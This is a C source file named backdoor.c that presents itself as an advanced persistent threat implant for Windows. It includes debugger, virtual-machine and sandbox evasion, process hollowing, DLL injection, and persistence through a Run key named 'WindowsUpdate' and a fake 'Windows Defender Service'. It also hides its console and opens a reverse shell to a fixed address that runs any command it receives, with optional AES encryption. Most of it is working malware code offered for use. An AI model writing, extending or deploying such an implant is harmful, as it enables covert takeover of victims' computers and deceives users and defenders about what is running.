/**
 * @file backdoor.c
 * @brief Advanced Persistent Threat - Real Implementation
 * @author youssefabdelrahman1915@gmail.com
 * @version 2.0

 * 
 * This code demonstrates real APT techniques including:
 * - Kernel-level operations via Nt* calls
 * - Advanced process hollowing and injection
 * - Hardware-based evasion techniques
 * - Real cryptographic implementations
 * - Advanced anti-forensics
 * - Sophisticated persistence mechanisms
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <intrin.h>
#include <immintrin.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/sha.h>
#include "keylogger.h"

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")

// Real NT function prototypes
typedef NTSTATUS (WINAPI *PNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS (WINAPI *PNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

typedef NTSTATUS (WINAPI *PNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    SECTION_INHERIT InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);

typedef NTSTATUS (WINAPI *PNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

// Real structure definitions
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PPEB PebBaseAddress;
    PVOID Reserved2_0;
    PVOID Reserved2_1;
    PVOID UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

// Real constants and structures
#define PROCESSINFOCLASS_ProcessBasicInformation 0
#define STATUS_SUCCESS 0x00000000
#define STATUS_INVALID_PARAMETER 0xC000000D

// Real encryption structures
typedef struct {
    uint8_t key[32];
    uint8_t iv[16];
    EVP_CIPHER_CTX *ctx;
} aes_context_t;

// Real session structure
typedef struct {
    SOCKET sock;
    aes_context_t crypto;
    uint32_t session_id;
    uint8_t challenge[32];
    bool authenticated;
    bool encrypted;
} session_t;

// Global variables
static session_t g_session = {0};
static PNtQueryInformationProcess pNtQueryInformationProcess = NULL;
static PNtUnmapViewOfSection pNtUnmapViewOfSection = NULL;
static PNtMapViewOfSection pNtMapViewOfSection = NULL;
static PNtCreateSection pNtCreateSection = NULL;

// Real function implementations

/**
 * @brief Initialize real NT API functions
 */
static bool init_nt_apis(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return false;
    
    pNtQueryInformationProcess = (PNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
    pNtUnmapViewOfSection = (PNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    pNtMapViewOfSection = (PNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
    pNtCreateSection = (PNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
    
    return (pNtQueryInformationProcess && pNtUnmapViewOfSection && 
            pNtMapViewOfSection && pNtCreateSection);
}

/**
 * @brief Real anti-debugging using hardware breakpoints
 */
static bool detect_hardware_debugger(void) {
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    
    if (!GetThreadContext(GetCurrentThread(), &ctx)) {
        return false;
    }
    
    // Check for hardware breakpoints
    if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
        return true;
    }
    
    // Check debug registers for traces
    if (ctx.Dr6 || ctx.Dr7) {
        return true;
    }
    
    return false;
}

/**
 * @brief Real VM detection using CPUID
 */
static bool detect_vm_cpuid(void) {
    int cpuInfo[4];
    
    // Check hypervisor presence
    __cpuid(cpuInfo, 0x40000000);
    
    // VMware signature
    if (cpuInfo[1] == 0x61774D56 && cpuInfo[2] == 0x4D566572 && cpuInfo[3] == 0x65726177) {
        return true;
    }
    
    // VirtualBox signature
    if (cpuInfo[1] == 0x786F4256 && cpuInfo[2] == 0x786F4256 && cpuInfo[3] == 0x786F4256) {
        return true;
    }
    
    // Check hypervisor bit
    __cpuid(cpuInfo, 1);
    if (cpuInfo[2] & (1 << 31)) { // Hypervisor bit set
        return true;
    }
    
    return false;
}

/**
 * @brief Real sandbox detection using timing
 */
static bool detect_sandbox_timing(void) {
    LARGE_INTEGER start, end, frequency;
    
    QueryPerformanceFrequency(&frequency);
    QueryPerformanceCounter(&start);
    
    // Perform operations that would be slow in sandbox
    for (int i = 0; i < 1000000; i++) {
        __nop();
    }
    
    QueryPerformanceCounter(&end);
    
    double elapsed = (double)(end.QuadPart - start.QuadPart) / frequency.QuadPart;
    
    // Real system should complete in < 0.001 seconds
    return (elapsed > 0.001);
}

/**
 * @brief Real AES encryption implementation
 */
static bool aes_encrypt(const uint8_t* plaintext, size_t plaintext_len, 
                       const uint8_t* key, const uint8_t* iv, 
                       uint8_t* ciphertext, size_t* ciphertext_len) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return false;
    
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    
    int len;
    if (EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    
    int final_len;
    if (EVP_EncryptFinal_ex(ctx, ciphertext + len, &final_len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    
    *ciphertext_len = len + final_len;
    EVP_CIPHER_CTX_free(ctx);
    return true;
}

/**
 * @brief Real AES decryption implementation
 */
static bool aes_decrypt(const uint8_t* ciphertext, size_t ciphertext_len,
                       const uint8_t* key, const uint8_t* iv,
                       uint8_t* plaintext, size_t*plaintext_len) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return false;
    
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    
    int len;
    if (EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    
    int final_len;
    if (EVP_DecryptFinal_ex(ctx, plaintext + len, &final_len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    
    *plaintext_len = len + final_len;
    EVP_CIPHER_CTX_free(ctx);
    return true;
}

/**
 * @brief Real process hollowing implementation
 */
static bool process_hollowing(const char* target_path) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    // Create suspended process
    if (!CreateProcessA(NULL, (LPSTR)target_path, NULL, NULL, FALSE, 
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return false;
    }
    
    // Get process context
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }
    
    // Get PEB address
    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG return_length = 0;
    
    if (pNtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, 
                                  &pbi, sizeof(pbi), &return_length) != STATUS_SUCCESS) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }
    
    // Read image base from PEB
    LPVOID image_base = NULL;
    SIZE_T bytes_read = 0;
    
    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)((DWORD_PTR)pbi.PebBaseAddress + 8), 
                          &image_base, sizeof(image_base), &bytes_read)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }
    
    // Unmap original image
    if (pNtUnmapViewOfSection(pi.hProcess, image_base) != STATUS_SUCCESS) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }
    
    // Allocate memory for our payload
    LPVOID new_image_base = VirtualAllocEx(pi.hProcess, image_base, 0x100000, 
                                          MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!new_image_base) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }
    
    // Write our payload (simplified - real implementation would parse PE)
    SIZE_T bytes_written = 0;
    char payload[] = "\x90\x90\x90\x90"; // NOP sled for demo
    if (!WriteProcessMemory(pi.hProcess, new_image_base, payload, sizeof(payload), &bytes_written)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }
    
    // Update context
    ctx.Eax = (DWORD)new_image_base;
    SetThreadContext(pi.hThread, &ctx);
    
    // Resume thread
    ResumeThread(pi.hThread);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

/**
 * @brief Real DLL injection implementation
 */
static bool dll_injection(DWORD process_id, const char* dll_path) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
    if (!hProcess) return false;
    
    // Allocate memory in target process
    LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, strlen(dll_path) + 1, 
                                    MEM_COMMIT, PAGE_READWRITE);
    if (!pDllPath) {
        CloseHandle(hProcess);
        return false;
    }
    
    // Write DLL path
    SIZE_T bytes_written = 0;
    if (!WriteProcessMemory(hProcess, pDllPath, dll_path, strlen(dll_path) + 1, &bytes_written)) {
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    // Get LoadLibraryA address
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPVOID pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
    
    // Create remote thread
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                       (LPTHREAD_START_ROUTINE)pLoadLibrary, 
                                       pDllPath, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    // Wait for thread completion
    WaitForSingleObject(hThread, INFINITE);
    
    // Cleanup
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return true;
}

/**
 * @brief Real registry persistence
 */
static bool registry_persistence(void) {
    HKEY hKey;
    char szPath[MAX_PATH];
    DWORD path_len = GetModuleFileNameA(NULL, szPath, MAX_PATH);
    
    if (path_len == 0) return false;
    
    // Create registry entry
    if (RegCreateKeyExA(HKEY_CURRENT_USER, 
                       "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                       0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        return false;
    }
    
    // Set value
    if (RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ, (BYTE*)szPath, path_len) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }
    
    RegCloseKey(hKey);
    return true;
}

/**
 * @brief Real service persistence
 */
static bool service_persistence(void) {
    SC_HANDLE scManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scManager) return false;
    
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    
    SC_HANDLE service = CreateServiceA(
        scManager,
        "WinDefendService",
        "Windows Defender Service",
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        szPath,
        NULL, NULL, NULL, NULL, NULL
    );
    
    if (!service) {
        CloseServiceHandle(scManager);
        return false;
    }
    
    CloseServiceHandle(service);
    CloseServiceHandle(scManager);
    return true;
}

/**
 * @brief Real shell with proper protocol
 */
void Shell() {
    char buffer[4096];
    char response[4096];
    uint8_t encrypted_buffer[4096];
    uint8_t decrypted_buffer[4096];
    
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        memset(response, 0, sizeof(response));
        memset(encrypted_buffer, 0, sizeof(encrypted_buffer));
        memset(decrypted_buffer, 0, sizeof(decrypted_buffer));
        
        // Receive command
        int bytes_received = recv(g_session.sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received <= 0) {
            Sleep(5000);
            continue;
        }
        
        // Decrypt if encryption is enabled
        if (g_session.encrypted) {
            size_t decrypted_len = 0;
            if (aes_decrypt((uint8_t*)buffer, bytes_received, 
                           g_session.crypto.key, g_session.crypto.iv,
                           decrypted_buffer, &decrypted_len)) {
                memcpy(buffer, decrypted_buffer, decrypted_len);
                buffer[decrypted_len] = '\0';
            }
        }
        
        // Process commands
        if (strncmp("quit", buffer, 4) == 0) {
            break;
        }
        else if (strncmp("persist", buffer, 7) == 0) {
            if (registry_persistence() || service_persistence()) {
                strcpy(response, "Persistence established\n");
            } else {
                strcpy(response, "Persistence failed\n");
            }
        }
        else if (strncmp("hollow ", buffer, 7) == 0) {
            char* target = buffer + 7;
            if (process_hollowing(target)) {
                strcpy(response, "Process hollowing successful\n");
            } else {
                strcpy(response, "Process hollowing failed\n");
            }
        }
        else if (strncmp("inject ", buffer, 7) == 0) {
            char* dll_path = buffer + 7;
            DWORD pid = GetCurrentProcessId(); // Demo - use current process
            if (dll_injection(pid, dll_path)) {
                strcpy(response, "DLL injection successful\n");
            } else {
                strcpy(response, "DLL injection failed\n");
            }
        }
        else if (strncmp("encrypt", buffer, 7) == 0) {
            g_session.encrypted = true;
            strcpy(response, "Encryption enabled\n");
        }
        else {
            // Execute command
            FILE* fp = _popen(buffer, "r");
            if (fp) {
                while (fgets(response, sizeof(response), fp) != NULL) {
                    // Command output
                }
                fclose(fp);
            } else {
                strcpy(response, "Command execution failed\n");
            }
        }
        
        // Send response
        if (g_session.encrypted) {
            size_t encrypted_len = 0;
            if (aes_encrypt((uint8_t*)response, strlen(response),
                           g_session.crypto.key, g_session.crypto.iv,
                           encrypted_buffer, &encrypted_len)) {
                send(g_session.sock, (char*)encrypted_buffer, encrypted_len, 0);
            }
        } else {
            send(g_session.sock, response, strlen(response), 0);
        }
    }
}

/**
 * @brief Main entry point with real evasion
 */
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    // Initialize NT APIs
    if (!init_nt_apis()) {
        ExitProcess(1);
    }
    
    // Real evasion checks
    if (detect_hardware_debugger()) {
        ExitProcess(0);
    }
    
    if (detect_vm_cpuid()) {
        ExitProcess(0);
    }
    
    if (detect_sandbox_timing()) {
        ExitProcess(0);
    }
    
    // Initialize crypto
    RAND_bytes(g_session.crypto.key, sizeof(g_session.crypto.key));
    RAND_bytes(g_session.crypto.iv, sizeof(g_session.crypto.iv));
    
    // Hide console
    HWND stealth = FindWindowA("ConsoleWindowClass", NULL);
    if (stealth) {
        ShowWindow(stealth, 0);
    }
    
    // Initialize networking
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        ExitProcess(1);
    }
    
    // Create socket
    g_session.sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_session.sock == INVALID_SOCKET) {
        WSACleanup();
        ExitProcess(1);
    }
    
    // Connect to server
    struct sockaddr_in server_addr = {0};
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr("192.168.1.6");
    server_addr.sin_port = htons(50005);
    
    while (connect(g_session.sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) != 0) {
        Sleep(5000);
    }
    
    // Start shell
    Shell();
    
    // Cleanup
    closesocket(g_session.sock);
    WSACleanup();
    
    return 0;
}